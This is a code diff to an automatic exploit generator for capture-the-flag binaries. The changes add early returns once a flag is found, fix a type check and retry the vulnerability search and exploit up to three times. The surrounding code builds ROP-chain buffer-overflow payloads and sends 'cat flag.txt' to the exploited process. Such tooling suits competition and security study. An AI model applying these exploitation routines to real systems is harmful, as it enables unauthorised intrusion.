@@ -246,6 +246,7 @@ class rAEG:
             if string >= 0xffffffffff:
                 self.has_leak = True
 
+        # Make sure that angr doesn't read too much
         def analyze_input(state):
             size = state.solver.eval(state.regs.rsi)
             if size >= 1000:
@@ -600,8 +601,10 @@ class rAEG:
             if b"flag" in output:
                 self.flag = b"flag{" + output.split(b"{")[1].replace(b" ", b"").replace(b"\n", b"").split(b"}")[0] + b"}"
                 self.flag = self.flag.decode()
+                return 1
         except:
             logger.info("ROP chain exploit failed")
+            return -1
 
 
 
@@ -619,6 +622,7 @@ class rAEG:
                 self.rop_chain += self.rop_chain_call_function(self.exploit_function, self.parameters)
         else:
             self.rop_chain =  self.rop_chain_call_function(self.exploit_function, self.parameters)
+
 
 
     def format_leak(self):
@@ -850,6 +854,10 @@ class rAEG:
 
         addr = self.elf.get_section_by_name(".data").header.sh_addr
 
+        if self.flag != None:
+            print(self.flag)
+            return
+
         if self.rop_chain != None:
             if self.symbolic_padding != None:
                 if len(self.symbolic_padding) == self.padding:
@@ -858,7 +866,6 @@ class rAEG:
                 else:
                     logger.info(f"Sending ROP Chain with {self.padding} padding")
                     if type(self.exploit_function) == int and len(self.parameters) > 0:
-                        print("win parameters")
                         padding = b"A" * (self.padding - 8) + p64(addr)
                     else:
                         padding = b"A" * self.padding
@@ -866,12 +873,11 @@ class rAEG:
                     p.sendline(padding + self.rop_chain)
             else:
                 logger.info(f"Sending ROP Chain with {self.padding} padding")
-                if type(self.exploit_function) and len(self.parameters) > 0:
-                    print("win parameters")
+                if type(self.exploit_function) == int and len(self.parameters) > 0:
                     padding = b"A" * (self.padding - 8) + p64(addr)
                 else:
                     padding = b"A" * self.padding
-                p.sendline(padding + self.rop_chain)
+                    p.sendline(padding + self.rop_chain)
 
 
             p.sendline(b"cat flag.txt")
@@ -887,12 +893,6 @@ class rAEG:
                 logger.info("ROP chain exploit failed")
 
 
-        # Assume that its a format challenge either format write or format leak
-        else:
-            # Insert leak stack function here
-            if self.flag != None:
-                print(self.flag)
-            # If there is a buffer overflow and no symbolic padding
 
 
 
@@ -928,6 +928,10 @@ if __name__ == "__main__":
     arguments = parser.parse_args()
     rage = rAEG(args.BIN, "/opt/libc.so.6")
 
-    rage.find_vulnerability()
+    for i in range(3):
+        if rage.flag != None:
+            break
+        rage.find_vulnerability()
+        rage.exploit()
 
-    rage.exploit()
+
